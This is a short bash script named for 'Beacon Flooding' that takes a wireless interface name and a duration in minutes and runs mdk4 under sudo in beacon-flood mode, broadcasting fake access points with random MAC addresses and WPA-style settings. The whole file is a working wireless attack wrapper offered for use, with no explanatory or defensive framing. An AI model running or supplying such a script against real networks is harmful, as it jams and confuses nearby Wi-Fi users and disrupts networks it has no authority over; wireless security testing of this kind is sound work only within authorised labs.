#!/bin/bash

#Beacon Flooding

if [ "$#" -lt 2 ]
then
    echo "[*] Usages: ./beconFlooding.sh {Interface_name} {Miniutes}"
    exit 1
fi

if [ "$#" -eq 2 ]
then
	sudo timeout "$2"m mdk4 "$1" b -a -w nta -m
fi



